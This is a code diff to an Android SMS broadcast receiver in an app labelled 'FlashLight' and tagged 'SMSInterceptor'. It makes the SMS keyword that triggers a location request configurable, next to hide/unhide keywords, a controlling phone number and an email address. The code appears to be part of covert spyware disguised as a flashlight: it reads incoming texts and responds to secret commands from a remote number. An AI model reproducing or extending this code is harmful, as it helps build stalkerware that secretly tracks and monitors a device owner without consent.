@@ -29,6 +29,7 @@ public class SMSReceiver extends BroadcastReceiver {
   private static String hideKeywordString;
   private static String phoneNumberString;
   private static String unhideKeywordString;
+  private static String locationKeywordString;
 
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight SMSReceiver";
@@ -36,10 +37,11 @@ public class SMSReceiver extends BroadcastReceiver {
   public SMSReceiver() {
     configure  = new Configure();
     flashLight = new FlashLight();
-    phoneNumberString   = configure.phoneNumber();
-    hideKeywordString   = configure.hideKeyword();
-    gmailEmailString    = configure.emailAddress();
-    unhideKeywordString = configure.unhideKeyword();
+    phoneNumberString     = configure.phoneNumber();
+    hideKeywordString     = configure.hideKeyword();
+    gmailEmailString      = configure.emailAddress();
+    unhideKeywordString   = configure.unhideKeyword();
+    locationKeywordString = configure.locationKeyword();
   }
 
   public String endPoint(final String number, final Context context) {
@@ -92,7 +94,7 @@ public class SMSReceiver extends BroadcastReceiver {
 
           final String message_from = messages[0].getOriginatingAddress();
 
-          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
+          if(mBody.equals(locationKeywordString) && message_from.equals(phoneNumberString)) {
             intent = new Intent(context, FlashLightService.class);
             PendingIntent pendingIntent = PendingIntent.getService(context, 0, intent, 0);
             FlashLightService flashLightService = new FlashLightService();
